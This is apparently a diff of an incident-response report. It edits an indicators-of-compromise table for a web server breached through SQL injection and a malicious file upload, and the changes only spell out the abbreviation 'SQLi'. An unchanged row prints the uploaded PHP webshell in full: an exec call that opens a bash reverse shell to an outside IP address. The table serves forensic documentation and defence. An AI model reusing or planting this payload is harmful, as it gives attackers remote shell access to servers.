@@ -238,11 +238,11 @@ Immediate remediation actions are recommended below.
 | File Name | NVri2vhp.php | Malicious webshell uploaded to server |
 | File Path | /admin/uploads/NVri2vhp.php | Location of webshell on victim server |
 | File Hash | fe0e27b7170726fa576934d823b7da9037c1c93aa77cfe8ab2dde5ed0f45d7b8 | Unique identifier for the payload |
-| User-Agent | sqlmap | Automated SQLi tool |
+| User-Agent | sqlmap | Automated SQL injection tool |
 | User-Agent | gobuster | Directory enumeration tool |
-| Targeted Endpoint | /search.php | SQLi entry point |
+| Targeted Endpoint | /search.php | SQL injection entry point |
 | Targeted Endpoint | /admin/index.php | Malicious file upload endpoint |
-| Compromised Credential | admin / [REDACTED] | Exfiltrated via SQLi, used for admin logon |
+| Compromised Credential | admin / [REDACTED] | Exfiltrated via SQL injection, used for admin logon |
 | Malicious Code | `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>` | Reverse shell payload contents |
 
 
